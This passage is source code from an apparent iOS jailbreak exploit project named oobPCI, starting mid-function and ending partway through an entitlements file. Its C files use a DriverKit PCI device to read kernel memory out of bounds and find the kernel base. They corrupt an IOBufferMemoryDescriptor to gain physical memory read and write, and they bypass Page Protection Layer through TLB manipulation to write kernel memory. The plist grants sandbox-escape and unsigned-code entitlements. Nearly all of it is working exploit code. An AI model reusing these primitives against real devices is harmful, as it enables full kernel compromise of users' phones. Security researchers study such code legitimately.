            if (l == len) {
                *base    = v;
                *vtblOut = 0xFFFFFF8000000000ULL | vtbl;
                return true;
            }
        }
    }
    
    return false;
}

bool kernel_starts_here(uint64_t addr) {
    return pcidev_r64(addr) == 0x100000cfeedfacfULL && pcidev_r64(addr + 8) == 0x2c0000002ULL;
}

uint64_t search_for_my_mapping(uint64_t start, uint64_t low25) {
    uint64_t base = 0;
    uint64_t vtbl = 0;
    
    while (1) {
        if (pageHasMemoryMap(start, low25, PCI_MEMORY_SIZE, &base, &vtbl)) {
            printf("PCIMemory @ %p\n", (void*) base);
            printf("VTBL @ %p\n", (void*) vtbl);
            
            // Make sure all other accesses are absolute, not relative
            pcidev_set_base_offset(0ULL - base);
            
            // Search for the kernel start
            uint64_t kStart = vtbl & ~0x3FFFULL;
            while (!kernel_starts_here(kStart)) {
                kStart -= 0x4000;
            }
            
            printf("Kernel base @ %p\n", (void*) kStart);
            
            return kStart;
        }
        
        start += 0x4000;
    }
}

bool is_boot_args(uint64_t addr) {
    // Already checked the version and stuff
    // Make sure the pointers look valid
    
    // Virtual base should be a virtual address
    uint64_t virt = pcidev_r64(addr + 0x08);
    
    // Physical base should be a physical address
    uint64_t phys = pcidev_r64(addr + 0x10);
    
    // Top of kernel data should be a physical address
    uint64_t top  = pcidev_r64(addr + 0x20);
    
    return IS_VIRT_ADDR(virt) && IS_PHYS_ADDR(phys) && IS_PHYS_ADDR(top);
}

bool oobPCI_init(uint64_t *kBase, uint64_t *virtBaseOut, uint64_t *physBaseOut) {
    // Magic function to get token and tag
    void (*getTokenTag)(uint64_t*, uint64_t*) = (void(*)(uint64_t*, uint64_t*)) DBG_DK_FUNC_CHECKIN;
    uint64_t token = 0;
    uint64_t tag   = 0;
    
    getTokenTag(&token, &tag);
    
    io_service_t service = IORegistryEntryFromPath(ioMasterPort, "IOService:/");
    guard (service != 0) else {
        puts("Failed to get IOPlatformExpertDevice!");
        return false;
    }
    
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self_, DRIVERKIT_TYPE, &conn);
    guard (kr == KERN_SUCCESS) else {
        printf("IOServiceOpen failed! [%x]\n", kr);
        return false;
    }
    
    uint64_t serverDKPort = 0;
    mach_msg_type_number_t outCount = 1;
    mach_msg_type_number_t outCountInband = 0;
    mach_vm_size_t outCountOOB = 0;
    kr = io_connect_method(conn, kIOUserServerMethodStart, &token, 1, NULL, 0, 0, 0, NULL, &outCountInband, &serverDKPort, &outCount, 0, &outCountOOB);
    guard (kr == KERN_SUCCESS) else {
        printf("io_connect_method failed! [%x]\n", kr);
        return false;
    }
    
    puts("Initializing DriverKit...");
    dk_init(conn, (mach_port_t) serverDKPort);
    
    puts("Checking in...");
    user_server_checkin("PWNUserServer", tag);
    
    puts("Creating root dispatch queue...");
    mach_port_t rootQueue = create_dispatch_queue("Root");
    
    mach_port_t rqPort;
    kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &rqPort);
    guard (kr == KERN_SUCCESS) else {
        printf("mach_port_allocate failed! [%x]\n", kr);
        return false;
    }
    
    kr = mach_port_insert_right(mach_task_self_, rqPort, rqPort, MACH_MSG_TYPE_MAKE_SEND);
    guard (kr == KERN_SUCCESS) else {
        printf("mach_port_insert_right failed! [%x]\n", kr);
        return false;
    }
    
    dispatch_queue_set_port(rootQueue, rqPort);
    
    puts("Registering...");
    server_register();
    
    puts("Waiting for start message...");
    mach_port_t pciDevice = server_get_provider(rqPort);
    mach_port_deallocate(mach_task_self_, rqPort);
    
    puts("Opening PCI Device...");
    pcidev_open_session(pciDevice);
    
    puts("Opened PCI Device!");
    
    uint64_t offset = PHYSMAP_OFFSET;
    uint64_t virtBase = 0;
    uint64_t physBase = 0;
    while (1) {
        uint64_t cur = pcidev_r64(offset);
        if (cur == 0x20002 && is_boot_args(offset)) {
            puts("Found boot-args!");
            
            virtBase = pcidev_r64(offset + 0x08);
            physBase = pcidev_r64(offset + 0x10);
            
            printf("Virt base @ %p\n", (void*) virtBase);
            printf("Phys base @ %p\n", (void*) physBase);
            
            break;
        }
        
        offset -= 0x4000;
    }
    
    uint64_t bootArgs = offset;
    uint64_t bootArgsPhys = pcidev_r64(bootArgs + 0x20) - 0x4000;
    
    offset += 0x4000;
    uint64_t i = 0;
    
    while (1) {
        for (uint64_t e = 0; e < (0x4000ULL / 8ULL); e++) {
            uint64_t entry = pcidev_r64(offset + (e * 8));
            if ((entry & 0xFFFFFFFFC000) == bootArgsPhys) {
                // This is our entry!
                uint64_t offInPhysmap = (i * 0x2000000) + (e * 0x4000);
                printf("Offset in physmap: %p\n", (void*) offInPhysmap);
                
                uint64_t first = bootArgs - offInPhysmap;
                uint64_t low25 = 0x2000000ULL - (first & 0x1FFFFFFULL);
                printf("Low25 Bits are: %p\n", (void*) low25);
                
                *kBase = search_for_my_mapping(bootArgs + MAPPING_MIN_OFFSET, low25);
                *virtBaseOut = virtBase;
                *physBaseOut = physBase;
                
                return true;
            }
        }
        
        i += 1;
        offset += 0x4000;
    }
}

```

`Exploits/oobPCI/Sources/oobPCI.h`:

```h
//
//  oobPCI.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//


#ifndef oobPCI_h
#define oobPCI_h

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

bool oobPCI_init(uint64_t *kBase, uint64_t *virtBase, uint64_t *physBase);

#endif /* oobPCI_h */

```

`Exploits/oobPCI/Sources/physrw.c`:

```c
//
//  physrw.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include "physrw.h"

#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>

#include "includeme.h"
#include "offsets.h"
#include "DriverKit.h"

uint64_t    gRanges = 0;
mach_port_t gBuffer = 0;
mach_port_t gDMACommand = 0;
mach_port_t gDMABuffer = 0;
uint64_t    gDMABufferMapped = 0;
uint64_t    cpuTTEP = 0;

bool buildPhysPrimitive(uint64_t kernelBase) {
    // Get memory descriptor referencing physical memory
    mach_port_t buffer = pcidev_copy_memory(0);
    guard (buffer != 0) else {
        puts("[-] buildPhysPrimitive: Failed to create IOBufferMemoryDescriptor!");
        return false;
    }
    
    // Modify the IOBufferMemoryDescriptor to map physical memory
    // Get kObject
    uint64_t kObject = portKObject(buffer);
    guard (kObject != 0) else {
        puts("[-] buildPhysPrimitive: Failed to get IOBufferMemoryDescriptor kObject!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(kObject);
    
    // Change flags and ranges
    uint32_t memFlags = pcidev_r32(kObject + 0x20);
    
    DBGPRINT_VAR(memFlags);
    
    memFlags = (memFlags & ~0xF0) | 0x20; // Mark as physical
    
    // Get ranges
    uint64_t memRanges = pcidev_rPtr(kObject + 0x60);
    guard (memRanges != 0) else {
        puts("[-] buildPhysPrimitive: Failed to get IOBufferMemoryDescriptor _ranges!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(memRanges);
    
    uint64_t oldStart = pcidev_rPtr(memRanges);
    uint64_t oldLen   = pcidev_rPtr(memRanges + 0x8);
    
    DBGPRINT_ADDRVAR(oldStart);
    DBGPRINT_ADDRVAR(oldLen);
    
    // Set ranges
    pcidev_w64(memRanges, 0x800000000ULL);
    
    puts("[+] buildPhysPrimitive: Got IOMemoryDescriptor to map physical memory!");
    
    // Create IODMACommand
    mach_port_t dmaCommand = IODMACommand_create();
    guard (dmaCommand != 0) else {
        puts("[-] buildPhysPrimitive: Failed to create IODMACommand!");
        return false;
    }
    
    // Create another IOMemoryBuffer
    mach_port_t dmaBuffer = IOBufferMemoryDescriptor_create(3, 0x4000, 0);
    guard (dmaBuffer != 0) else {
        puts("[-] buildPhysPrimitive: Failed to create second IOBufferMemoryDescriptor!");
        return false;
    }
    
    // Map it
    uint64_t mapAddr = IOMemoryDescriptor_map(dmaBuffer, 0, 0);
    guard (mapAddr != 0) else {
        puts("[-] buildPhysPrimitive: Failed to map IOBufferMemoryDescriptor!");
        return false;
    }
    
    // Prepare dma command
    IODMACommand_prepare(dmaCommand, dmaBuffer);
    
    puts("[+] buildPhysPrimitive: IODMACommand ready!");
    
    gRanges          = memRanges;
    gBuffer          = buffer;
    gDMACommand      = dmaCommand;
    gDMABuffer       = dmaBuffer;
    gDMABufferMapped = mapAddr;
    cpuTTEP          = pcidev_r64(SLIDE(gOffsets.cpu_ttep));
    
    DBGPRINT_ADDRVAR(cpuTTEP);
    
    return true;
}

bool physread(uint64_t addr, size_t len, void *buffer) {
    if (len > 0x4000) {
        return false;
    }
    
    pcidev_w64(gRanges, addr);
    
    IODMACommand_readFrom(gDMACommand, gBuffer,    len);
    IODMACommand_writeTo(gDMACommand,  gDMABuffer, len);
    
    memcpy(buffer, (void*) gDMABufferMapped, len);
    
    return true;
}

bool physwrite(uint64_t addr, void *buffer, size_t len) {
    if (len > 0x4000) {
        return false;
    }
    
    pcidev_w64(gRanges, addr);
    
    memcpy((void*) gDMABufferMapped, buffer, len);
    
    IODMACommand_readFrom(gDMACommand, gDMABuffer, len);
    IODMACommand_writeTo(gDMACommand,  gBuffer,    len);
    
    return true;
}

uint64_t rp64(uint64_t addr) {
    uint64_t result = 0;
    physread(addr, sizeof(uint64_t), &result);
    
    return result;
}

uint32_t rp32(uint64_t addr) {
    uint32_t result = 0;
    physread(addr, sizeof(uint32_t), &result);
    
    return result;
}

uint16_t rp16(uint64_t addr) {
    uint16_t result = 0;
    physread(addr, sizeof(uint16_t), &result);
    
    return result;
}

uint8_t rp8(uint64_t addr) {
    uint8_t result = 0;
    physread(addr, sizeof(uint8_t), &result);
    
    return result;
}

uint64_t translateAddr_inTTEP(uint64_t ttep, uint64_t virt) {
    uint64_t table1Off = (virt >> 36ULL) & 0x7ULL;
    uint64_t table1Entry = rp64(ttep + (8ULL * table1Off));
    guard ((table1Entry & 0x3) == 3) else {
        //throw MemoryAccessError.failedToTranslate(address: virt, table: "table1", entry: table1Entry)
        return 0;
    }
    
    uint64_t table2 = table1Entry & 0xFFFFFFFFC000ULL;
    uint64_t table2Off = (virt >> 25ULL) & 0x7FFULL;
    uint64_t table2Entry = rp64(table2 + (8ULL * table2Off));
    switch (table2Entry & 0x3) {
        case 1:
            // Easy, this is a block
            return (table2Entry & 0xFFFFFE000000ULL) | (virt & 0x1FFFFFFULL);
            
        case 3: {
            uint64_t table3 = table2Entry & 0xFFFFFFFFC000ULL;
            uint64_t table3Off = (virt >> 14ULL) & 0x7FFULL;
            uint64_t table3Entry = rp64(table3 + (8ULL * table3Off));
            
            guard ((table3Entry & 0x3) == 3) else {
                //throw MemoryAccessError.failedToTranslate(address: virt, table: "table3", entry: table3Entry)
                return 0;
            }
            
            return (table3Entry & 0xFFFFFFFFC000ULL) | (virt & 0x3FFFULL);
        }
            
        default:
            return 0;
    }
}

uint64_t translateAddr(uint64_t virt) {
    return translateAddr_inTTEP(cpuTTEP, virt);
}

uint64_t physrw_map_once(uint64_t addr) {
    uint64_t page       = addr & ~0x3FFFULL;
    uint64_t off        = addr & 0x3FFFULL;
    uint64_t translated = translateAddr(page);
    
    // Only works once
    pcidev_w64(gRanges, translated);
    
    uint64_t mapped = IOMemoryDescriptor_map(gBuffer, 0, 0x4000ULL);
    guard (mapped != 0) else {
        return 0;
    }
    
    return mapped + off;
}

```

`Exploits/oobPCI/Sources/physrw.h`:

```h
//
//  physrw.h
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#ifndef physrw_h
#define physrw_h

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

bool buildPhysPrimitive(uint64_t kernelBase);

// R/W
bool physread(uint64_t addr, size_t len, void *buffer);
bool physwrite(uint64_t addr, void *buffer, size_t len);

uint64_t rp64(uint64_t addr);
uint32_t rp32(uint64_t addr);
uint16_t rp16(uint64_t addr);
uint8_t  rp8(uint64_t addr);

// Address translation
uint64_t translateAddr_inTTEP(uint64_t ttep, uint64_t virt);
uint64_t translateAddr(uint64_t virt);

// Internal function
// Can be used once to map arbitrary physical memory
uint64_t physrw_map_once(uint64_t addr);

#endif /* physrw_h */

```

`Exploits/oobPCI/Sources/print.c`:

```c
//
//  print.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include <stdio.h>
#include <stdbool.h>
#include <stdarg.h>
#include <unistd.h>
#include <stdint.h>

void printf_putchar(char ch) {
    write(STDOUT_FILENO, &ch, sizeof(ch));
}

int vprintf(const char * __restrict format, va_list vl) {
    bool special = false;
    
    while (*format) {
        if (special) {
            switch (*format) {
                case 'x':
                case 'p': {
                    // Pointer
                    printf_putchar('0');
                    printf_putchar('x');
                    
                    uintptr_t ptr = va_arg(vl, uintptr_t);
                    bool didWrite = false;
                    for (int i = 7; i >= 0; i--) {
                        uint8_t cur = (ptr >> (i * 8)) & 0xFF;
                        char first = cur >> 4;
                        if (first >= 0 && first <= 9) {
                            first = first + '0';
                        } else {
                            first = (first - 0xA) + 'A';
                        }
                        
                        char second = cur & 0xF;
                        if (second >= 0 && second <= 9) {
                            second = second + '0';
                        } else {
                            second = (second - 0xA) + 'A';
                        }
                        
                        if (didWrite || cur) {
                            if (didWrite || first != '0') {
                                printf_putchar(first);
                            }
                            
                            printf_putchar(second);
                            didWrite = true;
                        }
                    }
                    
                    if (!didWrite) {
                        printf_putchar('0');
                    }
                    break;
                }
                    
                case 's': {
                    const char *str = va_arg(vl, const char*);
                    if (str == NULL) {
                        str = "<NULL>";
                    }
                    
                    while (*str) {
                        printf_putchar(*str++);
                    }
                    break;
                }
                    
                case 'c':
                    printf_putchar(va_arg(vl, int));
                    break;
                    
                case 'l':
                    // Prefix, ignore
                    format++;
                    continue;
                    
                case '%':
                    printf_putchar(*format);
                    break;
                    
                default:
                    printf_putchar('%');
                    printf_putchar(*format);
                    break;
            }
            
            special = false;
        } else {
            if (*format == '%') {
                special = true;
            } else {
                printf_putchar(*format);
            }
        }
        
        format++;
    }
    
    return 0; // Not up to spec, but who uses the return value of (v)printf anyway?
}

int printf(const char * __restrict format, ...) {
    va_list vl;
    va_start(vl, format);
    
    int res = vprintf(format, vl);
    
    va_end(vl);
    
    return res;
}

#pragma clang optimize off

int puts(const char *str) {
    return printf("%s\n", str);
}

#pragma clang optimize on

```

`Exploits/oobPCI/Sources/task.defs`:

```defs
/*
 * Copyright (c) 1999 Apple Computer, Inc. All rights reserved.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_START@
 * 
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. The rights granted to you under the License
 * may not be used to create, or enable the creation or redistribution of,
 * unlawful or unlicensed copies of an Apple operating system, or to
 * circumvent, violate, or enable the circumvention or violation of, any
 * terms of an Apple operating system software license agreement.
 * 
 * Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this file.
 * 
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 * 
 * @APPLE_OSREFERENCE_LICENSE_HEADER_END@
 */

#define LIBSYSCALL_INTERFACE 1

#include <mach/task.defs>

```

`Exploits/oobPCI/Sources/thread.defs`:

```defs
/*
 * Copyright (c) 1999 Apple Computer, Inc. All rights reserved.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_START@
 * 
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. The rights granted to you under the License
 * may not be used to create, or enable the creation or redistribution of,
 * unlawful or unlicensed copies of an Apple operating system, or to
 * circumvent, violate, or enable the circumvention or violation of, any
 * terms of an Apple operating system software license agreement.
 * 
 * Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this file.
 * 
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 * 
 * @APPLE_OSREFERENCE_LICENSE_HEADER_END@
 */

#define LIBSYSCALL_INTERFACE 1

#include <mach/thread_act.defs>

```

`Exploits/oobPCI/Sources/tlbFail.c`:

```c
//
//  tlbFail.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include "tlbFail.h"

#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>

#include "includeme.h"
#include "offsets.h"
#include "kernrw_alloc.h"
#include "physrw.h"
#include "kernel.h"
#include "xprr.h"
#include "badRecovery.h"

volatile uint64_t gBypassReady = 0;
volatile uint64_t gBypassDone  = 0;
uint64_t gMagicPPLMap   = 0;
uint64_t *gMagicPPLPage = NULL;

uint64_t pmap_lv1(uint64_t pmap, uint64_t virt) {
    uint64_t ttep = pcidev_r64(pmap + 0x8ULL);
    
    uint64_t table1Off   = (virt >> 36ULL) & 0x7ULL;
    uint64_t table1Entry = rp64(ttep + (8ULL * table1Off));
    
    return table1Entry;
}

uint64_t pmap_lv2(uint64_t pmap, uint64_t virt) {
    uint64_t ttep = pcidev_r64(pmap + 0x8ULL);
    
    uint64_t table1Off   = (virt >> 36ULL) & 0x7ULL;
    uint64_t table1Entry = rp64(ttep + (8ULL * table1Off));
    guard ((table1Entry & 0x3) == 3) else {
        return 0;
    }
    
    uint64_t table2 = table1Entry & 0xFFFFFFFFC000ULL;
    uint64_t table2Off = (virt >> 25ULL) & 0x7FFULL;
    uint64_t table2Entry = rp64(table2 + (8ULL * table2Off));
    
    return table2Entry;
}

uint64_t pmap_lv3(uint64_t pmap, uint64_t virt) {
    uint64_t ttep = pcidev_r64(pmap + 0x8ULL);
    
    return translateAddr_inTTEP(ttep, virt);
}

uint64_t pmapFirstFree(uint64_t pmap, uint64_t start) {
    start = start & ~0x3FFFULL;
    
    while (1) {
        if (pmap_lv2(pmap, start) && !pmap_lv3(pmap, start)) {
            return start;
        }
        
        start += 0x4000ULL;
    }
}

#define CREATE_PMAP() kcall(pmap_create_options, 0 /* ledger */, 0 /* size */, 0x1 /* flags */, 0, 0, 0, 0, 0)

bool pplBypass(void) {
    uint64_t page = kmemAlloc(0x8000, NULL, true); // Must leak this memory, PPL will own the page
    pcidev_w64(page, 0x41424344DEADBEEFULL);
    
    uint64_t pmap_create_options = SLIDE(gOffsets.pmap_create_options);
    
    uint64_t vmMap = TASK_VM_MAP(gOurTask);
    guard (vmMap != 0) else {
        puts("[-] pplBypass: Failed to find vmMap!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(vmMap);
    
    uint64_t ourPmap = VM_MAP_PMAP(vmMap);
    guard (ourPmap != 0) else {
        puts("[-] pplBypass: Failed to find our pmap!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(ourPmap);
    
    uint64_t ourTtep = PMAP_TTEP(ourPmap);
    guard (ourTtep != 0) else {
        puts("[-] pplBypass: Failed to find our ttep!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(ourTtep);
    
    uint64_t ourNestedMap = PMAP_NESTED_PMAP(ourPmap);
    guard (ourNestedMap != 0) else {
        puts("[-] pplBypass: Failed to find our nested pmap!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(ourNestedMap);
    
    uint64_t ourNestedAddr = PMAP_NESTED_ADDR(ourPmap);
    guard (ourNestedAddr != 0) else {
        puts("[-] pplBypass: Failed to find our nested address start!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(ourNestedAddr);
    
    uint64_t ourNestedSize = PMAP_NESTED_SIZE(ourPmap);
    guard (ourNestedSize != 0) else {
        puts("[-] pplBypass: Failed to find our nested size!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(ourNestedSize);
    
    uint64_t firstFree = pmapFirstFree(ourPmap, ourNestedAddr);
    guard (firstFree >= ourNestedAddr && firstFree < (ourNestedAddr + ourNestedSize)) else {
        puts("[-] pplBypass: Failed to find empty address in nested map!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(firstFree);
    
    // Create exploit pmap
    uint64_t exploitPmap = CREATE_PMAP();
    guard (exploitPmap != 0) else {
        puts("[-] pplBypass: Failed to create exploitPmap!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(exploitPmap);
    
    // Nest shared map into exploit pmap
    kern_return_t kr = pmap_nest(exploitPmap, ourNestedMap, ourNestedAddr, ourNestedSize);
    guard (kr == KERN_SUCCESS) else {
        printf("[-] pplBypass: Failed to nest! [%p]\n", (void*)(uint64_t) kr);
        return false;
    }
    
    puts("[+] pplBypass: Nest succeded!");
    
    // Get physical addresses
    uint64_t pagePhys = translateAddr(page);
    uint64_t pagePhys2 = translateAddr(page + 0x4000);
    
    // Map pagePhys2 to pagePhys
    // This will free pagePhys
    kr = pmap_enter_options_addr(gKernelPmap, pagePhys2, page);
    guard (kr == KERN_SUCCESS) else {
        printf("[-] pplBypass: Failed to get physical page! [%p]\n", (void*)(uint64_t) kr);
        return false;
    }
    
    // We can now freely use pagePhys
    DBGPRINT_ADDRVAR(pagePhys);
    
    // Map this page into our exploit pmap
    // Should also be visible for us
    kr = pmap_enter_options_addr(exploitPmap, pagePhys, firstFree);
    guard (kr == KERN_SUCCESS) else {
        printf("[-] pplBypass: Failed to map pagePhys! [%p]\n", (void*)(uint64_t) kr);
        return false;
    }
    
    // Set fault handler
    void (*setFaultHandler)(uint64_t faultHandler) = (void(*)(uint64_t)) DBG_SET_FAULT_HNDLR;
    setFaultHandler((uint64_t) ptrauth_strip(ppl_done, ptrauth_key_function_pointer));
    
    // Create target page
    uint64_t page_R_va   = 0x318000000;
    vm_address_t vm_addr = page_R_va;
    
    kr = vm_allocate(mach_task_self(), &vm_addr, 0x4000, VM_FLAGS_FIXED);
    guard (kr == KERN_SUCCESS) else {
        puts("[-] pplBypass: Failed to allocate fixed!");
        return false;
    }
    
    uint64_t pteEntry = pagePhys | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
    
    // Keep the TLB for that page alive
    kRegisterState tlbKeeperState;
    tlbKeeperState.x[0] = pteEntry;                 // Value to write
    tlbKeeperState.x[1] = firstFree + 0x2000ULL;    // Write to our magic page
    tlbKeeperState.x[2] = (uint64_t) &gBypassDone;  // Done variable
    tlbKeeperState.x[3] = (uint64_t) &gBypassReady; // Ready variable
    
    tlbKeeperState.pc = (uint64_t) ptrauth_strip(ppl_loop, ptrauth_key_function_pointer);
    tlbKeeperState.cpsr = CPSR_USER_INTR_DIS;
    
    thread_t userspaceExploitThread = 0;
    kexec_on_new_thread(&tlbKeeperState, &userspaceExploitThread);
    
    uint64_t *ptr = (uint64_t*) firstFree;
    printf("Content: %p\n", (void*) *ptr);
    
    while (!gBypassReady) {
        ;
    }
    
    pmap_remove(exploitPmap, firstFree, firstFree + 0x4000ULL);
    pmap_mark_page_as_ppl_page(pagePhys);
    
    // Reclaim page
    *(uint64_t *)page_R_va = 0xeeeeffff;
    
    // We're done
    gBypassDone = 1;
    
    // Halt exploit thread
    thread_suspend(userspaceExploitThread);
    thread_abort(userspaceExploitThread);
    thread_terminate(userspaceExploitThread);
    
    // The phys page should map itself at entry 1024
    uint64_t *magic = (uint64_t*) (page_R_va + 0x1000000ULL);
    
    // Verify by reading from the page
    guard (magic[1024] == pteEntry) else {
        puts("[-] pplBypass: Failed to map level3 translation table!");
        return false;
    }
    
    puts("[+] PPL bypass succeded!!!");
    
    gMagicPPLMap  = page_R_va;
    gMagicPPLPage = magic;
    
    return true;
}

void* getPhysMapWindow(uint64_t phys) {
    phys &= 0xFFFFFFFFC000ULL;
    
    // First check if already mapped somewhere
    uint64_t *entry = NULL;
    void *entryVA   = NULL;
    for (size_t i = 0; i < 2048; i++) {
        uint64_t val = gMagicPPLPage[i] & 0xFFFFFFFFC000ULL;
        if (val == phys) {
            return (void*) (gMagicPPLMap + (i << 14ULL));
        } else if (entry == NULL && val == 0) {
            entry   = &gMagicPPLPage[i];
            entryVA = (void*) (gMagicPPLMap + (i << 14ULL));
        }
    }
    
    // Not mapped?
    if (entry) {
        *entry = phys | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
        return entryVA;
    }
    
    return NULL;
}

bool physwrite_PPL(uint64_t addr, void *buf, size_t len) {
    uint8_t *buffer = (uint8_t*) buf;
    
    while (len) {
        uint64_t page   = addr & ~0x3FFFULL;
        uint64_t off    = addr & 0x3FFFULL;
        uint64_t curLen = 0x4000ULL - off;
        if (len < curLen) {
            curLen = len;
        }
        
        uint8_t *mapped = (uint8_t*) getPhysMapWindow(page);
        guard (mapped != NULL) else {
            return false;
        }
        
        memcpy(mapped + off, buffer, curLen);
        
        addr   += curLen;
        buffer += curLen;
        len    -= curLen;
    }
    
    return true;
}

bool kernwrite_PPL(uint64_t addr, void *buf, size_t len) {
    uint8_t *buffer = (uint8_t*) buf;
    
    while (len) {
        uint64_t page   = addr & ~0x3FFFULL;
        uint64_t off    = addr & 0x3FFFULL;
        uint64_t curLen = 0x4000ULL - off;
        if (len < curLen) {
            curLen = len;
        }
        
        uint64_t phys = translateAddr(page);
        guard (phys != 0) else {
            return false;
        }
        
        uint8_t *mapped = (uint8_t*) getPhysMapWindow(phys);
        guard (mapped != NULL) else {
            return false;
        }
        
        memcpy(mapped + off, buffer, curLen);
        
        addr   += curLen;
        buffer += curLen;
        len    -= curLen;
    }
    
    return true;
}

```

`Exploits/oobPCI/Sources/tlbFail.h`:

```h
//
//  tlbFail.h
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#ifndef tlbFail_h
#define tlbFail_h

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

bool pplBypass(void);

void* getPhysMapWindow(uint64_t phys);

bool physwrite_PPL(uint64_t addr, void *buffer, size_t len);
bool kernwrite_PPL(uint64_t addr, void *buffer, size_t len);

uint64_t pmap_lv2(uint64_t pmap, uint64_t virt);

#endif /* tlbFail_h */

```

`Exploits/oobPCI/Sources/xprr.h`:

```h
//
//  xprr.h
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#ifndef xprr_h
#define xprr_h

#define PTE_TO_PERM(pte)  ((((pte) >> 4ULL) & 0xC) | (((pte) >> 52ULL) & 2) | (((pte) >> 54ULL) & 1))
#define _PERM_TO_PTE(perm) ((((perm) & 0xC) << 4ULL) | (((perm) & 2) << 52ULL) | (((perm) & 1) << 54ULL))
#define PERM_TO_PTE(perm) _PERM_TO_PTE((uint64_t) (perm))

#define PERM_KRW_URW 0x7 // R/W for kernel and user

#define PTE_NON_GLOBAL      (1ULL << 11ULL)
#define PTE_VALID           (1ULL << 10ULL) // Access flag
#define PTE_OUTER_SHAREABLE (2ULL << 8ULL)
#define PTE_INNER_SHAREABLE (3ULL << 8ULL)

#define PTE_LEVEL3_ENTRY (PTE_VALID | 0x3ULL)

#endif /* xprr_h */

```

`Exploits/oobPCI/oobPCI.entitlements`:

```entitlements
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>com.apple.security.get-task-allow</key>
	<true/>
	<key>platform-application</key>
	<true/>
	<key>task_for_pid-allow</key>
	<true/>
	<key>run-unsigned-code</key>
	<true/>
	<key>proc_info-allow</key>
	<true/>
	<key>com.apple.rootless.storage.MobileStorageMounter</key>
	<true/>
	<key>com.apple.private.kernel.system-override</key>
	<true/>
	<key>com.apple.private.persona-mgmt</key>
	<true/>
	<key>com.apple.private.iokit.system-nvram-allow</key>
	<true/>
	<key>com.apple.security.iokit-user-client-class</key>
	<array>
		<string>IOUserServer</string>
		<string>RootDomainUserClient</string>
	</array>
	<key>com.apple.security.exception.iokit-user-client-class</key>
	<array>
		<string>IOUserServer</string>
		<string>RootDomainUserClient</string>
	</array>
	<key>com.apple.private.apfs.revert-to-snapshot</key>
	<true/>
	<key>com.apple.private.security.kext-collection-management</key>
	<true/>
	<key>com.apple.private.security.kext-management</key>
	<true/>
	<key>com.apple.system-task-ports</key>
	<true/>
	<key>com.apple.private.security.storage.SystemExtensionManagement</key>
	<true/>
	<key>com.apple.private.security.syspolicy.kext-management</key>
	<true/>
	<key>com.apple.private.spawn-driver</key>
	<true/>
	<key>com.apple.private.tcc.allow</key>
	<array>
		<string>kTCCServiceSystemPolicyAllFiles</string>
	</array>
	<key>com.apple.private.security.no-container</key>
	<true/>
	<key>com.apple.private.security.storage-exempt.heritable</key>
	<true/>
	<key>com.apple.private.security.storage.AppBundles</key>
	<true/>
	<key>com.apple.private.security.no-sandbox</key>
	<true/>
	<key>com.apple.springboard.CFUserNotification</key>
	<true/>
	<key>com.apple.springboard.launchapplications</key>
	<true/>
	<key>com.apple.private.apfs.trim-active-file</key>
	<true/>
